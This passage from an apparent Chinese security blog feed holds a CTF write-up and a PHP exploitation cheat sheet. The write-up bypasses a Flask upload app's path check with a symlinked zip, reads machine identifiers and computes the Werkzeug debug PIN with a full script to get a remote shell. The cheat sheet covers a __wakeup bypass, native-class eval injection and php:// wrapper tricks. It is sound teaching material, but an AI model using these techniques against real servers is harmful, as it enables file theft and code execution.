punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/display'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/display/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/display/&lt;path:extractdir>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">display</span><span class="token punctuation">(</span>extractdir<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"\.\."</span><span class="token punctuation">,</span> extractdir<span class="token punctuation">,</span> re<span class="token punctuation">.</span>M <span class="token operator">|</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Hacker?"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>extractdir<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> make_response<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>extractdir<span class="token punctuation">)</span><span class="token punctuation">:</span>                f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>extractdir<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>                response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'application/octet-stream'</span>                <span class="token keyword">return</span> response            <span class="token keyword">else</span><span class="token punctuation">:</span>                fn <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>extractdir<span class="token punctuation">)</span>                fn <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">".."</span><span class="token punctuation">]</span> <span class="token operator">+</span> fn                f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"templates/template.html"</span><span class="token punctuation">)</span>                x <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                ret <span class="token operator">=</span> <span class="token string">"&lt;h1>文件列表:&lt;/h1>&lt;br>&lt;hr>"</span>                <span class="token keyword">for</span> i <span class="token keyword">in</span> fn<span class="token punctuation">:</span>                    tpath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'/display'</span><span class="token punctuation">,</span> extractdir<span class="token punctuation">,</span> i<span class="token punctuation">)</span>                    ret <span class="token operator">+=</span> <span class="token string">"&lt;a href='"</span> <span class="token operator">+</span> tpath <span class="token operator">+</span> <span class="token string">"'>"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">"&lt;/a>&lt;br>"</span>                x <span class="token operator">=</span> x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"HTMLTEXT"</span><span class="token punctuation">,</span> ret<span class="token punctuation">)</span>                <span class="token keyword">return</span> x<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr    uploadpath <span class="token operator">=</span> <span class="token string">'uploads/'</span> <span class="token operator">+</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>uploadpath<span class="token punctuation">)</span><span class="token punctuation">:</span>        os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>uploadpath<span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            upFile <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>upFile<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>            <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>splitext<span class="token punctuation">(</span>upFile<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'.zip'</span><span class="token punctuation">:</span>                filepath<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uploadpath<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>md5<span class="token punctuation">(</span>upFile<span class="token punctuation">.</span>filename<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token format-spec">4]</span><span class="token punctuation">&#125;</span></span><span class="token string">.zip"</span></span>                upFile<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>                zipDatas <span class="token operator">=</span> extractFile<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>                <span class="token keyword">return</span> zipDatas            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>upFile<span class="token punctuation">.</span>filename<span class="token punctuation">&#125;</span></span><span class="token string"> is not a zip file !"</span></span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> make_response<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总结就是会对上传的文件重命名解压，并且在访问文件时通过<code>../</code>来执行目录穿越，没关系我们直接用软连接<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171847624.png"></p><p>可以看到x时一个指向根目录的软连接，压缩，上传，访问，目录穿越可以进行任意的文件读取了</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171847477.png">但是这时候我们直接点击flag发现无法读取并且报错，可能没有权限并且debug模式是开启的，那我们可以考虑通过计算PIN值打开console来RCE<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171849327.png"></p><p>所需的文件如下：</p><blockquote><p>/sys/class/net/eth0/address</p><p>/etc/machine-id </p><p>/proc/sys/kernel/random/boot_id #本题环境存在machine-id所以不需要boot_id了</p><p>/proc/self/cgroup</p></blockquote><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171857744.png"></p><p>使用脚本来计算PIN值</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chainprobably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'ctf'</span><span class="token comment"># /etc/passwd</span>    <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment"># 默认值</span>    <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment"># 默认值</span>    <span class="token string">'/usr/local/lib/python3.8/site-packages/flask/app.py'</span> <span class="token comment"># 报错得到</span><span class="token punctuation">]</span>private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'95532648517'</span><span class="token punctuation">,</span><span class="token comment">#  /sys/class/net/eth0/address 16进制转10进制</span><span class="token string">'96cec10d3d9307792745ec3b85c896207445bfc71ac17f0f2e5d5488c55c3346ea36da9d417b8f57364ddc5081f3f9b1'</span><span class="token comment">#  /etc/machine-id+/proc/self/cgroup</span><span class="token punctuation">]</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>rv <span class="token operator">=</span><span class="token boolean">None</span><span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        rv <span class="token operator">=</span> num<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171853259.png"></p><p>直接访问/console RCE</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171854614.png"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;8fd00724-65fe-4c1c-a13d-83b4fc68c8aa&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP Trick</title>
      <link href="/posts/95491106.html"/>
      <url>/posts/95491106.html</url>
      
        <content type="html"><![CDATA[        <h1 id="PHP-Trick"   >          <a href="#PHP-Trick" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP-Trick" class="headerlink" title="PHP Trick"></a>PHP Trick</h1>              <h2 id="反序列化"   >          <a href="#反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2>      <p>首先肯定要把所有的魔术方法看一看啦</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 构造函数<span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  析构函数<span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span>在对象中调用一个不可访问方法时，<span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 会被调用<span class="token function">__callStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span>在静态上下文中调用一个不可访问方法时，<span class="token function">__callStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 会被调用<span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>读取不可访问或不存在的属性的值时，<span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 会被调用<span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>在给不可访问或不存在的属性赋值时，<span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 会被调用<span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>当对不可访问或不存在的属性调用 <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 或 <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 时，<span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 会被调用<span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>当对不可访问或不存在的属性调用 <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 时，<span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 会被调用<span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>当对一个对象进行序列化操作时，会先调用<span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>方法再进行序列化操作<span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 当对一个对象进行反序列化操作时，会先调用<span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>方法再进行序列化操作<span class="token function">__serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>和<span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>方法作用基本相同<span class="token function">__unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 和<span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>方法作用基本相同<span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>方法用于一个类被当成字符串时应怎样回应，只能返回字符串不然会飙错<span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>当尝试以调用函数的方式调用一个对象时，<span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 方法会被自动调用<span class="token function">__set_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span>当调用 <span class="token function">var_export</span><span class="token punctuation">(</span><span class="token punctuation">)</span>导出类时，此静态方法会被调用<span class="token function">__clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>对象复制可以通过 <span class="token keyword">clone</span> 关键字来完成（如果可能，这将调用对象的 <span class="token function">__clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 方法）。<span class="token function">__debugInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>当通过 <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 转储对象，获取应该要显示的属性的时候， 该函数就会被调用。如果对象中没有定义该方法，那么将会展示所有的公有、受保护和私有的属性。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h3 id="wakeup"   >          <a href="#wakeup" class="heading-link"><i class="fas fa-link"></i></a><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3>      <p>经典的CVE绕过wakeup方法<strong>CVE-2016-7124</strong></p><p>影响范围：</p><p>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p><p>只需要构造出序列化的字符串并将属性数改为大于真实属性数即可</p>        <h3 id="destruct"   >          <a href="#destruct" class="heading-link"><i class="fas fa-link"></i></a><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3>      <p>对于php版本在8.0以下的，只要让程序运行过程中抛出异常，就不会执行<code>__destruct()</code>方法，但是<code>die</code>方法实惠正常进行垃圾回收并触发<code>__destruct()</code>方法的</p>        <h3 id="call-（-callStatic-）"   >          <a href="#call-（-callStatic-）" class="heading-link"><i class="fas fa-link"></i></a><a href="#call-（-callStatic-）" class="headerlink" title="__call()（__callStatic()）"></a>__call()（__callStatic()）</h3>      <p>先来看以下call的官方说明格式</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$function_name</span><span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 方法体</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>也就是说你传一个参数也好多个参数也罢，这些内容都会被以数组的形式存储起来，所以在<code>__call()</code>方法中调用参数内容时一定一定要按照array的形式调用</p>        <h3 id="原生类"   >          <a href="#原生类" class="heading-link"><i class="fas fa-link"></i></a><a href="#原生类" class="headerlink" title="原生类"></a>原生类</h3>      <p>有时候反序列化会碰到没有给出足够使用的类的时候，这时我们可以利用一把PHP自带的原生类进行构造（以下内容都在PHP7环境中进行测试）</p><p><strong>Exception</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token comment">//Exception: 1 in /Users/jlan/PhpstormProjects/untitled/index.php:2 Stack trace: #0 &#123;main&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们发现传出的内容为：<code>Exception: 传入的字符串</code>如果此时正好有<code>eval</code>包裹了该类变量我们就能通过传入<code>xx;恶意代码;/*</code>达到任意命令执行的效果</p><p><strong>FilesystemIterator</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FilesystemIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>  <span class="token comment">//index.php</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传入目录返回一个迭代器，<code>toString</code>返回迭代器的第一项，可使用glob协议进行通配</p><p><strong>DirectoryIterator</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>  <span class="token comment">//index.php</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同上</p><p><strong>GlobIterator</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a&#x3D;new GlobIterator(&quot;.&#x2F;f*&quot;);echo $a;&#x2F;&#x2F;flag.txt?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>GlobIterator和上方这两个类差不多，不过glob是GlobIterator类本身自带的，因此在遍历的时候，就不需要带上glob协议头了，只需要后面的相关内容</p><p><strong>SplFileObject</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">SplFileObject</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token comment">//读取文件首行内容</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SplFileObject这个类返回的也是一个迭代器，但是可以用伪协议啊</p><p><strong>SplFileInfo</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">SplFileInfo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phpinfo();"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token comment">//phpinfo();</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原封不动返回传入内容</p><p><strong>Error</strong></p><p>和<strong>Exception</strong>完全一致</p>        <h2 id="URL解析"   >          <a href="#URL解析" class="heading-link"><i class="fas fa-link"></i></a><a href="#URL解析" class="headerlink" title="URL解析"></a>URL解析</h2>              <h2 id="文件包含"   >          <a href="#文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2>      <p>很重要的一定是各种伪协议了</p><pre class="line-numbers language-none"><code class="language-none">file:&#x2F;&#x2F;直接读取文件，不受allow_url_fopen和allow_url_include影响data:&#x2F;&#x2F;[&lt;MIME-type&gt;][;cherset&#x3D;&lt;encoding&gt;][;base64],&lt;data&gt;可以直接往里面放内容zip:&#x2F;&#x2F;[压缩包绝对路径]#[压缩包内文件]可以直接读取压缩包中的文件php:&#x2F;&#x2F;input直接读取请求体的所有内容php:&#x2F;&#x2F;output纯写入个人感觉还没啥大用php:&#x2F;&#x2F;fd包含文件描述符指向的文件php:&#x2F;&#x2F;memory读写内存的临时文件，没感觉有啥利用方法（php:&#x2F;&#x2F;temp上面的升级版，在临时文件&gt;2MB时就会从内存中拉出来变成在默认sys_get_temp_dir目录下的文件php:&#x2F;&#x2F;filter文件读取过滤器phar:&#x2F;&#x2F;就是phar啊你还想要什么（其实也可以和zip一样读取压缩包内容）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h3 id="php-filter"   >          <a href="#php-filter" class="heading-link"><i class="fas fa-link"></i></a><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3>      <p>最能玩出花来的一个协议，最基础的当然是base64读取了</p><pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;xxx.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>中间convert可用的内容有</p><pre class="line-numbers language-none"><code class="language-none">convert.quoted-printable-encode将文本中的不可见字符转换为可打印的字符进行输出convert.quoted-printable-decode 上述逆过程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>说实话还没怎么见过这个用法，<del>倒也确实没啥卵用</del></p><p>其中可用的最多的就是这个</p><pre class="line-numbers language-none"><code class="language-none">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个转换器可以将内容从任意一个编码转换为另一种编码，<span class="exturl"><a class="exturl__link"   href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d" >https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h2 id="文件上传"   >          <a href="#文件上传" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2>      <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" 